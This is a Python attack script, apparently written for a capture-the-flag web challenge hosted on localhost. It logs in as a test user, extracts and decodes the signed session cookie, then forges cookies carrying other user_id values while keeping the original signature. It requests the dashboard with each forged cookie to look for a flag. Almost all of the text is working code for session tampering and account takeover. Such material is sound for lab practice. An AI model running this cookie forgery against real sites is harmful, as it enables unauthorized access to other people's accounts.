import requests
import re
import base64

base_url = "http://127.0.0.1:32933"

print("[+] Properly capturing and using session cookie...")
print("=" * 60)

# Step 1: POST to / - no cookies needed yet
print("\n[+] POST / (username=test)")
resp1 = requests.post(base_url + "/", data={'username': 'test'}, allow_redirects=False)
print(f"    Status: {resp1.status_code}, Location: {resp1.headers.get('Location')}")

# Step 2: GET /password/test - no cookies
print("\n[+] GET /password/test")
resp2 = requests.get(base_url + "/password/test", allow_redirects=False)
print(f"    Status: {resp2.status_code}")

# Extract user_id from form
uid = re.findall(r'name="user_id".*?value="(\d+)"', resp2.text)[0]
print(f"    User ID: {uid}")

# Step 3: POST password - this creates session
print(f"\n[+] POST /password/test (password=test)")
resp3 = requests.post(base_url + "/password/test",
                     data={'username': 'test', 'user_id': uid, 'password': 'test'},
                     allow_redirects=False)
print(f"    Status: {resp3.status_code}")
print(f"    Location: {resp3.headers.get('Location')}")
set_cookie = resp3.headers.get('Set-Cookie')
print(f"    Set-Cookie: {set_cookie}")

# Extract session from Set-Cookie header
if set_cookie and 'session=' in set_cookie:
    session_cookie = set_cookie.split('session=')[1].split(';')[0]
    print(f"    Extracted session: {session_cookie}")
    
    # Step 4: Access /dashboard with the session cookie
    print("\n[+] GET /dashboard with session cookie")
    headers = {'Cookie': f'session={session_cookie}', 'User-Agent': 'Mozilla/5.0'}
    resp4 = requests.get(base_url + "/dashboard", headers=headers)
    print(f"    Status: {resp4.status_code}")
    print(f"    Size: {len(resp4.text)}")
    
    if resp4.status_code != 500 and len(resp4.text) > 200:
        print(f"    Content preview:\n{resp4.text[:2000]}")
        
        # Extract all endpoints
        links = re.findall(r'href=["\']([^"\']+)["\']', resp4.text)
        non_static = [l for l in links if not l.startswith('/static/')]
        print(f"\n    Non-static links: {non_static}")
        
        # Look for ID parameters in forms
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', resp4.text)
        print(f"    Form inputs: {list(set(inputs))}")
        
        # Check for FLAG
        flags = re.findall(r'FLAG\{[^}]+\}', resp4.text, re.I)
        if flags:
            print(f"\n[!] FLAG FOUND: {flags}")
            print(f"    Full response:\n{resp4.text}")
    else:
        print(f"    Response: {resp4.text[:500]}")

# Parse the session cookie to understand its structure
print("\n[+] Analyzing session cookie structure...")
# Format: eyJ1c2VyX2lkIjoxMDAzMn0.ac0J0Q.sC8jK855O5q0Kg18bVWYjy0Fmr4
parts = session_cookie.split('.')
print(f"    Parts: {len(parts)}")

if len(parts) >= 2:
    # Part 0 should be base64 of {"user_id":10032}
    try:
        part0 = base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4))
        print(f"    Part 0 (decoded): {part0}")
    except:
        print(f"    Part 0: {parts[0]}")
    
    # Part 1 is typically timestamp/random data
    print(f"    Part 1: {parts[1]}")

    # Part 2 is signature
    print(f"    Part 2 (signature): {parts[2][:20]}...")

# Try to modify the session to access other user accounts (if signature is not validated)
print("\n[+] Attempting session manipulation...")
original_payload = b'{"user_id":10032}'
modified_payload_10031 = b'{"user_id":10031}'
modified_payload_10033 = b'{"user_id":10033}'

# Encode payloads
enc_10031 = base64.urlsafe_b64encode(modified_payload_10031).decode().rstrip('=')
enc_10033 = base64.urlsafe_b64encode(modified_payload_10033).decode().rstrip('=')

# Create modified sessions (keeping same signature - might not work if signed)
mod_session_10031 = f"{enc_10031}.{parts[1]}.{parts[2]}"
mod_session_10033 = f"{enc_10033}.{parts[1]}.{parts[2]}"

print(f"    Original session (10032): {session_cookie[:40]}...")
print(f"    Modified session (10031): {mod_session_10031[:40]}...")
print(f"    Modified session (10033): {mod_session_10033[:40]}...")

# Test modified sessions
for label, test_session in [('10031', mod_session_10031), ('10033', mod_session_10033)]:
    print(f"\n[+] Testing modified session for user_id={label}")
    test_headers = {'Cookie': f'session={test_session}', 'User-Agent': 'Mozilla/5.0'}
    test_resp = requests.get(base_url + "/dashboard", headers=test_headers)
    print(f"    Status: {test_resp.status_code}, Size: {len(test_resp.text)}")
    
    if test_resp.status_code != 500 and len(test_resp.text) > 200:
        print(f"    [!] Different response! Content:\n{test_resp.text[:1500]}")
        flags = re.findall(r'FLAG\{[^}]+\}', test_resp.text, re.I)
        if flags:
            print(f"    [!] FLAG FOUND: {flags}")
